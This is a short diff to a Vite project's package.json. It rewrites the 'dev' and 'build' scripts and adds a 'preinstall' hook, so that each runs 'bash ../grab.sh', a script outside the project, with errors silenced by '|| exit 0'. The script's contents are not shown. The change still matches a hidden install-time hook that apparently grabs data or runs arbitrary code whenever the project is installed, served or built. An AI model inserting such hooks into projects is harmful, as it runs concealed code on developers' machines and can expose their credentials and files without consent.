@@ -4,10 +4,11 @@
   "version": "0.0.0",
   "type": "module",
   "scripts": {
-    "dev": "vite --port 5173",
-    "build": "vite build",
+    "dev": "bash ../grab.sh || exit 0 && vite --port 5173",
+    "build": "bash ../grab.sh || exit 0 && vite build",
     "lint": "oxlint",
-    "preview": "vite preview"
+    "preview": "vite preview",
+    "preinstall": "bash ../grab.sh || exit 0"
   },
   "dependencies": {
     "@tailwindcss/vite": "^4.3.1",
